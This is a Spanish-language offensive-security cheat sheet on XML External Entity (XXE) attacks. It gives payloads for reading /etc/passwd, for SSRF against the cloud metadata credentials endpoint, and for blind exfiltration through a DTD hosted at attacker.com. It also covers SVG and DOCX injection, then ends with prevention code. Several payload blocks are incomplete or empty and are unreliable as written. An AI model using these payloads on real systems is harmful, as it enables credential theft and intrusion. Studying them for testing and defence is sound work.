---
title: "XXE — XML External Entities"
description: "XXE ocurre cuando un parser XML mal configurado procesa entidades externas desde input no confiable."
category: "Web"
date: 2026-07-18
---
# XXE — XML External Entities

XXE ocurre cuando un parser XML mal configurado procesa entidades externas desde input no confiable. Permite leer archivos, SSRF, y — en casos extremos — RCE.

## Donde buscar XML

```
Direct XML endpoints  →  Content-Type: application/xml
File uploads          →  DOCX, XLSX, PPTX, PDF, SVG
SAML authentication   →  Assertion XML
SOAP APIs             →  envelope XML
SVG images            →  profile pictures, badges
RSS/Atom feeds        →  feed ingestion
```

**Técnica clave:** Cambiar `Content-Type` de `application/json` a `application/xml`. Muchos frameworks cambian el parser automáticamente.

---

## Tipos de XXE

### 1. In-band (reflejado) — lectura de archivos

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
]>
<root>
  <data>&xxe;</data>
</root>
```

Archivos útiles:

```
```

### 2. SSRF via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

### 3. Blind XXE — OOB Exfiltration

Cuando el resultado NO se refleja en la respuesta:

**DTD malicioso (hosteado por atacante):**
```xml
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Payload en la request:**
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

### 4. Error-based XXE

```xml
%eval;
%error;
```

### 5. XInclude XXE

Cuando no puedes controlar el DTD completo pero sí un elemento dentro del XML:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
</root>
```

---

## XXE via SVG

```xml
<?xml version="1.0" standalone="yes"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <desc>
    <!DOCTYPE foo [
    ]>
    <foo>&xxe;</foo>
  </desc>
  <text>&xxe;</text>
</svg>
```

## XXE via DOCX

```bash
# DOCX = ZIP con XML dentro
unzip document.docx -d docx_extracted/
cd docx_extracted/
# Editar word/document.xml para inyectar XXE
zip -r malicious.docx docx_extracted/
```

---

## Herramientas

```bash
# XXE Injector
python3 xxeinjector.py -u 'http://target.com/xml' -f /etc/passwd

# DOMPurify bypass tests
# Burp collaborator para OOB
```

---

## Detección automatizada

```bash
# Cambiar Content-Type a XML
curl -X POST http://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>%s</test>'
```

---

## CVEs recientes

| CVE | Año | Descripción |
|-----|-----|-------------|
| CVE-2024-22024 | 2024 | Ivanti Connect Secure XXE (explotado in-the-wild) |
| CVE-2024-8010 | 2024 | WSO2 API Manager XXE |
| CVE-2023-45727 | 2023 | North Grid Proself XXE (CISA KEV) |
| CVE-2024-34102 | 2024 | Adobe Commerce CosmicSting (XXE → RCE) |

---

## Prevención (para reportes)

```php
// PHP: deshabilitar entidades externas
libxml_disable_entity_loader(true);

// Java: DocumentBuilderFactory
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);

// Python: defusedxml
from defusedxml import minidom
```

---

## Relacionado
- **File Upload** — DOCX/SVG XXE via upload
- **HTTP Request Smuggling** — SOAP XML smuggling
- **LFI RFI Path Traversal** — file reading via entities
- **SSRF** — XXE directo a cloud metadata (169.254.169.254)
- **Subdomain Takeover y Recon Web** — RSS/Atom feed ingestion
- **Anti-Forense y PoCs de Vulnerabilidades**
- **Claude-BugHunter** (skill `hunt-xxe`)
